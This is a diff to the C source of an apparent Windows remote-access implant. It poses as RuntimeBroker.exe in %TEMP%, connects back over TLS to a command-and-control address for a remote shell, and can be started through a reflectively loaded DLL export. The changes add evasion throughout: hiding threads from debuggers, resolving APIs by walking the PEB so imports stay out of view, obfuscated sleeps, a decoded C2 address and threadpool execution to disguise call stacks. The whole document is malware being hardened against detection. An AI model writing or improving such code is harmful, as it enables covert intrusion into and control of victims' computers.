@@ -16,6 +16,9 @@
 #include "../evasion/spoof.h"
 #include "../evasion/evasion.h"
 #include "../evasion/sandbox.h"
+#include "../evasion/syscall.h"
+#include "../evasion/k32_walk.h"
+#include "../evasion/sleep_obf.h"
 #include "../inject/inject.h"
 #include "../shell/shell.h"
 #include "../../tls/tls_client.h"
@@ -178,7 +181,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     /* ── Debug: initialise log first so every subsequent event is captured */
     DBG_INIT();
     DBG_PROCESS();
-    DBG_LOG(DBG_SS_INIT, DBG_INFO, "WinMain entry");
+    DBG_LOG(DBG_SS_INIT, DBG_INFO, "WinMain entry — build %s %s", __DATE__, __TIME__);
+
+    /* ── 0. Harden this thread against debuggers ─────────────────────────
+     * NtSetInformationThread(HideThreadFromDebugger) — no-op on clean
+     * systems; prevents single-step / breakpoint events in a debugger. */
+    sandbox_harden();
+    DBG_LOG(DBG_SS_SANDBOX, DBG_INFO, "sandbox_harden() applied to WinMain thread");
 
     /* ── 0. Resolve absolute key path before anything else ──────────────
      * Must happen first: GetModuleFileNameA(NULL) returns our EXE path   *
@@ -204,7 +213,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     /* ── 0d. Migrate to %TEMP%\RuntimeBroker.exe and exit launcher ───── */
     {
         DWORD _load_rc = ntcalls_load();
-        DBG_NTCALLS(_load_rc, ntcalls_verify());
+        DWORD _verify_rc = ntcalls_verify();
+        DBG_NTCALLS(_load_rc, _verify_rc);
         BOOL _inj = inject_init();  /* calls sc_init() — resolves SSNs via PEB */
         DBG_LOG(DBG_SS_INJECT, _inj ? DBG_OK : DBG_ERR,
                 "inject_init() = %s", _inj ? "TRUE (all NT pointers resolved)"
@@ -269,7 +279,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             mutexName[_i] = rawMutex[_i];
         mutexName[mLen] = '\0';
 #endif
-        CreateMutexA(NULL, FALSE, mutexName);
+        k32_CreateMutexA(NULL, FALSE, mutexName);
         SecureZeroMemory(mutexName, sizeof(mutexName));
     }
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
@@ -292,15 +302,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     DBG_LOG(DBG_SS_EVASION, DBG_OK,   "evasion patches applied");
 #endif
 
-    /* ── 2. NT syscall pointers ──────────────────────────────────────── */
-    /* ntcalls_load resolves optional power/BSOD functions (forceoff,    *
-     * bluescreen).  On Windows 11 24H2 some of these are absent from    *
-     * ntdll exports — that is fine.  Never gate startup on this.        */
-    {
-        DWORD _lr = ntcalls_load();
-        DWORD _vr = ntcalls_verify();
-        DBG_NTCALLS(_lr, _vr);
-    }
+    /* ntcalls_load / ntcalls_verify already ran above in step 0d.       */
 
     /* ── 3. Winsock 2.2 ──────────────────────────────────────────────── */
     /* No AllocConsole/ShowWindow needed — the binary is built with      */
@@ -328,9 +330,19 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             DBG_CLOSE();
             return 0x01;
         }
+        /* Wipe the path string so it doesn't linger in .data or a heap dump.
+         * The key bytes are already decoded into secretKey above.           */
+        SecureZeroMemory(g_key_path, sizeof(g_key_path));
     }
 
     /* ── 6. Reconnect loop ───────────────────────────────────────────── */
+    /* Decode C2 address once — stored in a stack buffer for the loop.   *
+     * SecureZeroMemory after the loop (unreachable in practice, but      *
+     * zero it here for hygiene anyway).                                  */
+    char _c2_ip_buf[64] = {0};
+    c2_ip_decode(_c2_ip_buf, sizeof(_c2_ip_buf));
+    WORD _c2_port = c2_port_decode();
+
     while (1) {
 
         /* BUG 6: a new socket must be created on every outer iteration.
@@ -341,49 +353,49 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == INVALID_SOCKET) {
             DBG_LOG(DBG_SS_NET, DBG_WARN, "socket() failed — retrying");
-            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             continue;
         }
 
         struct sockaddr_in addr;
         memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
-        addr.sin_port   = htons(C2_PORT);
+        addr.sin_port   = htons(_c2_port);
 
         /* BUG 5: inet_addr() is deprecated, rejects IPv6, and returns
          * INADDR_NONE for "255.255.255.255" without any error indicator.
          * InetPtonA handles both IPv4 and IPv6 correctly.               */
-        if (InetPtonA(AF_INET, C2_IP, &addr.sin_addr) != 1) {
+        if (InetPtonA(AF_INET, _c2_ip_buf, &addr.sin_addr) != 1) {
             /* C2_IP is a compile-time constant; if it fails here the
              * build itself is misconfigured — exit rather than loop.   */
             DBG_LOG(DBG_SS_NET, DBG_ERR,
-                    "InetPtonA('%s') failed — bad C2_IP at build time, exiting 0x04", C2_IP);
+                    "InetPtonA('%s') failed — bad C2_IP at build time, exiting 0x04", _c2_ip_buf);
             closesocket(sock);
             WSACleanup();
             DBG_CLOSE();
             return 0x04;
         }
-        DBG_LOG(DBG_SS_NET, DBG_INFO, "connecting to %s:%d", C2_IP, C2_PORT);
+        DBG_LOG(DBG_SS_NET, DBG_INFO, "connecting to %s:%d", _c2_ip_buf, (int)_c2_port);
 
         /* Retry TCP connect; recreate socket on each failure to avoid
          * using a socket that may have been put into an error state.   */
         while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
             DBG_LOG(DBG_SS_NET, DBG_WARN,
-                    "connect(%s:%d) failed (WSAErr=%d) — retrying", C2_IP, C2_PORT, WSAGetLastError());
+                    "connect(%s:%d) failed (WSAErr=%d) — retrying", _c2_ip_buf, (int)_c2_port, WSAGetLastError());
             closesocket(sock);
-            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock == INVALID_SOCKET) {
                 DBG_LOG(DBG_SS_NET, DBG_WARN, "socket() failed after connect retry — will retry again");
-                jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             }
         }
 
         if (sock == INVALID_SOCKET) {
-            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             continue;
         }
-        DBG_LOG(DBG_SS_NET, DBG_OK, "TCP connected to %s:%d", C2_IP, C2_PORT);
+        DBG_LOG(DBG_SS_NET, DBG_OK, "TCP connected to %s:%d", _c2_ip_buf, (int)_c2_port);
 
         /* ── Socket options — set once, after connect(), before TLS ──── */
         {
@@ -400,15 +412,15 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         TLS_CONTEXT tls;
         ZeroMemory(&tls, sizeof(tls));
         {
-            BOOL _tls_ok = tls_connect(&tls, sock, C2_IP, secretKey);
+            BOOL _tls_ok = tls_connect(&tls, sock, _c2_ip_buf, secretKey);
             DBG_TLS(_tls_ok, tls.lastErr);
             if (!_tls_ok) {
                 closesocket(sock);
-                jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
                 continue;
             }
         }
-        DBG_LOG(DBG_SS_TLS, DBG_OK, "TLS connected to %s:%d — entering shell loop", C2_IP, C2_PORT);
+        DBG_LOG(DBG_SS_TLS, DBG_OK, "TLS connected to %s:%d — entering shell loop", _c2_ip_buf, (int)_c2_port);
 
         /* BUG 7: wipe the key immediately after seeding the TLS context
          * so it does not linger in the stack frame for the rest of the
@@ -439,7 +451,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             }
         }
 
-        jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+        sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
     }
 
     /* Unreachable; WSACleanup / SecureZeroMemory called above */
@@ -458,12 +470,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
 
 __declspec(dllexport) void AgentRun(void)
 {
-    /* Resolve key path from our own module location */
-    HMODULE hSelf = NULL;
-    GetModuleHandleExA(
-        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
-        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-        (LPCSTR)&AgentRun, &hSelf);
+    /* Resolve key path from our own module location.
+     * Use VirtualQuery on &AgentRun to get AllocationBase (module base) so
+     * GetModuleHandleExA does not appear in the IAT.  Then pass the base to
+     * GetModuleFileNameA (which is fine — it only takes a HMODULE).          */
+    MEMORY_BASIC_INFORMATION _mbi_ar;
+    VirtualQuery((LPCVOID)&AgentRun, &_mbi_ar, sizeof(_mbi_ar));
+    HMODULE hSelf = (HMODULE)_mbi_ar.AllocationBase;
 
     char modPath[MAX_PATH] = {0};
     if (hSelf)
@@ -478,8 +491,13 @@ __declspec(dllexport) void AgentRun(void)
     }
     /* else g_key_path was already set by WinMain's resolve_key_path() */
 
-    HANDLE hThread = CreateThread(NULL, 0, _agent_thread, NULL, 0, NULL);
-    if (hThread) CloseHandle(hThread);
+    /* F-11: submit via threadpool so the thread call-stack shows
+     * ntdll!TppWorkerThread rather than a private RX address.     */
+    if (!sc_threadpool_exec((LPTHREAD_START_ROUTINE)_agent_thread, NULL)) {
+        /* Fallback if threadpool fails (should not happen on any Windows version) */
+        HANDLE hThread = k32_CreateThread(NULL, 0, _agent_thread, NULL, 0, NULL);
+        if (hThread) CloseHandle(hThread);
+    }
 }
 
 
@@ -496,6 +514,8 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
     DBG_INIT();
     DBG_LOG(DBG_SS_THREAD, DBG_INFO, "_agent_thread started (PID=%lu TID=%lu)",
             GetCurrentProcessId(), GetCurrentThreadId());
+    sandbox_harden();
+    DBG_LOG(DBG_SS_SANDBOX, DBG_INFO, "sandbox_harden() applied to _agent_thread");
 
     /* Initialise NT syscalls + inject */
     {
@@ -523,41 +543,45 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
         if (!_k) { WSACleanup(); return 1; }
     }
 
+    char _c2_ip_buf[64] = {0};
+    c2_ip_decode(_c2_ip_buf, sizeof(_c2_ip_buf));
+    WORD _c2_port = c2_port_decode();
+
     while (1) {
         DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: reconnect loop — creating socket");
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == INVALID_SOCKET) {
             DBG_LOG(DBG_SS_NET, DBG_WARN, "_agent_thread: socket() failed — retrying");
-            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             continue;
         }
 
         struct sockaddr_in addr;
         memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
-        addr.sin_port   = htons(C2_PORT);
+        addr.sin_port   = htons(_c2_port);
 
-        if (InetPtonA(AF_INET, C2_IP, &addr.sin_addr) != 1) {
+        if (InetPtonA(AF_INET, _c2_ip_buf, &addr.sin_addr) != 1) {
             DBG_LOG(DBG_SS_NET, DBG_ERR,
-                    "_agent_thread: InetPtonA('%s') failed — bad C2_IP", C2_IP);
+                    "_agent_thread: InetPtonA('%s') failed — bad C2_IP", _c2_ip_buf);
             closesocket(sock); WSACleanup(); return 4;
         }
-        DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: connecting to %s:%d", C2_IP, C2_PORT);
+        DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: connecting to %s:%d", _c2_ip_buf, (int)_c2_port);
 
         while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
             DBG_LOG(DBG_SS_NET, DBG_WARN,
                     "_agent_thread: connect(%s:%d) failed (WSAErr=%d) — retrying",
-                    C2_IP, C2_PORT, WSAGetLastError());
+                    _c2_ip_buf, (int)_c2_port, WSAGetLastError());
             closesocket(sock);
-            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock == INVALID_SOCKET) {
                 DBG_LOG(DBG_SS_NET, DBG_WARN, "_agent_thread: socket() failed after retry");
-                jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
             }
         }
-        if (sock == INVALID_SOCKET) { jitter_sleep(RECONNECT_DELAY_SEC * 1000); continue; }
-        DBG_LOG(DBG_SS_NET, DBG_OK, "_agent_thread: TCP connected to %s:%d", C2_IP, C2_PORT);
+        if (sock == INVALID_SOCKET) { sleep_obf_delay(RECONNECT_DELAY_SEC * 1000); continue; }
+        DBG_LOG(DBG_SS_NET, DBG_OK, "_agent_thread: TCP connected to %s:%d", _c2_ip_buf, (int)_c2_port);
 
         /* SO_RCVTIMEO + SO_KEEPALIVE */
         {
@@ -573,16 +597,16 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
         TLS_CONTEXT tls;
         ZeroMemory(&tls, sizeof(tls));
         {
-            BOOL _tok = tls_connect(&tls, sock, C2_IP, secretKey);
+            BOOL _tok = tls_connect(&tls, sock, _c2_ip_buf, secretKey);
             DBG_TLS(_tok, tls.lastErr);
             if (!_tok) {
                 closesocket(sock);
-                jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
                 continue;
             }
         }
         DBG_LOG(DBG_SS_TLS, DBG_OK,
-                "_agent_thread: TLS connected to %s:%d — entering shell loop", C2_IP, C2_PORT);
+                "_agent_thread: TLS connected to %s:%d — entering shell loop", _c2_ip_buf, (int)_c2_port);
 
         SecureZeroMemory(secretKey, sizeof(secretKey));
 
@@ -604,7 +628,7 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
                 return 1;
             }
         }
-        jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+        sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
     }
 }
 
@@ -642,9 +666,17 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
         }
 #endif
 
-        /* Spin up C2 loop on a background thread — DllMain must return fast */
-        HANDLE hThread = CreateThread(NULL, 0, _agent_thread, NULL, 0, NULL);
-        if (hThread) CloseHandle(hThread);
+        /* IMPORTANT: Do NOT call CreateThread here.  DllMain(DLL_PROCESS_ATTACH)
+         * holds the loader lock.  A new thread's DLL_THREAD_ATTACH callbacks for
+         * other loaded DLLs also need the loader lock, producing a classic
+         * loader-lock deadlock.  DisableThreadLibraryCalls only suppresses
+         * callbacks for THIS module — not for ntdll, kernel32, etc.
+         *
+         * The agent thread is started by AgentRun(), which is the explicit
+         * export called by the reflective loader after DllMain returns.
+         * In the unusual case where Windows calls DllMain directly (e.g. a
+         * manual LoadLibrary by a third party) the caller must invoke AgentRun()
+         * separately — there is no safe way to auto-start from DllMain.       */
     }
     return TRUE;
 }
